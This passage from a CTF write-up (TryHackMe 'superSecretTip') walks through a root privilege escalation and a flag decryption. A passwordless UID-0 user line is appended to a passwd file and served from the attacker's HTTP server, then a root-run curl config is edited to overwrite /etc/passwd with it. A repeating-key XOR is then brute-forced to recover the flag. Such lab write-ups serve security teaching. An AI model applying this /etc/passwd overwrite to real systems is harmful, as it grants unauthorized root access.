└─$ echo 'hacker::0:0:hacker:/home/hacker:/bin/bash' >> passwd   
```

In the target system we update `site_check` file to 

```
url = "http://10.21.65.152:8000/passwd"
output = "/etc/passwd"
```

We are able to write to `/etc/passwd` because the curl command is being executed with root user.

We get a call to our server 

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.50.184 - - [30/Sep/2025 11:16:01] "GET /passwd HTTP/1.1" 200 -
```

```bash
[snip]
ayham:x:1000:1000::/home/ayham:/bin/bash
F30s:x:1001:1001::/home/F30s:/bin/bash
hacker::0:0:hacker:/home/hacker:/bin/bash
F30s@482cbf2305ae:~$ su hacker
su hacker
id
uid=0(root) gid=0(root) groups=0(root)
```

in root directory 

```bash
ls
flag2.txt
secret.txt
cat flag2.txt
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
cat secret.txt
b'C^_M@__DC\\7,'
```

we have the flag2.txt which is encrypted and a secret.

Seems like another xor.. the prevous key we had earlier didn't work here.

extracting all the word form the secret-tip.txt file and using it to brutorce the key.

```bash
 tr -c "[:alnum:]'" '\n' < secret-tip.txt | sed '/^$/d' > words.txt
                                                                                                                                        
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/superSecretTip]
└─$ cat words.txt     
A
wise
gpt
once
[SNIP]
```

```python
#!/usr/bin/env python3
import sys

flag2 = b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
secret = b"C^_M@__DC\\7,"

def xor_repeat(data, key):
    if not key:
        return b""
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

if len(sys.argv) != 2:
    print("usage: python3 minimal_xor_try.py wordlist.txt")
    sys.exit(1)

with open(sys.argv[1], "r", errors="ignore") as f:
    for line in f:
        word = line.rstrip("\n\r")
        if word == "":
            continue
        key = word.encode("utf-8", errors="ignore")
        out_flag2 = xor_repeat(flag2, key)
        out_secret = xor_repeat(secret, key)
        print("KEY:", repr(key))
        print("FLAG2:", repr(out_flag2))
        print("SECRET:", repr(out_secret))
        print()
```

```bash
 python3 xor.py words.txt

[snip]

KEY: b'root'
FLAG2: b"\x17\x16\x126#-0*)351\x1c\x18n\x01%\x006\n\x13)`\x1d \x0b\r\x01\x1fk-!\x1ci4v1'\x00\x1a(l\x11\x1b\x00l: r0l)\x1f+o#p\x08\x1f'\x11#"
SECRET: b'1109200013XX'
```

Based on the secret-tip.txt we know we are missing two value in the `secret` most probably two digits.

```bash
seq -w 00 99 | sed 's/.*/1109200013&/' > variants.txt
                                                                                                                                        
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/superSecretTip]
└─$ python3 xor.py variants.txt                          
KEY: b'110920001300'
FLAG2: b'THM{cronjoju_F1Le_iNPu?YcURL_4re_5k2ry_Wh3N_C0ed1n3d_t0g3T@cR}'
SECRET: b'rootrootro\x07\x1c'

KEY: b'110920001301'
FLAG2: b'THM{cronjojt_F1Le_iNPu?XcURL_4re_5k3ry_Wh3N_C0ee1n3d_t0g3T@bR}'
SECRET: b'rootrootro\x07\x1d'

KEY: b'110920001302'
FLAG2: b'THM{cronjojw_F1Le_iNPu?[cURL_4re_5k0ry_Wh3N_C0ef1n3d_t0g3T@aR}'
SECRET: b'rootrootro\x07\x1e'

[SNIP]
```

Now we are trying to get the value of `flag2.txt` just assume the secret.

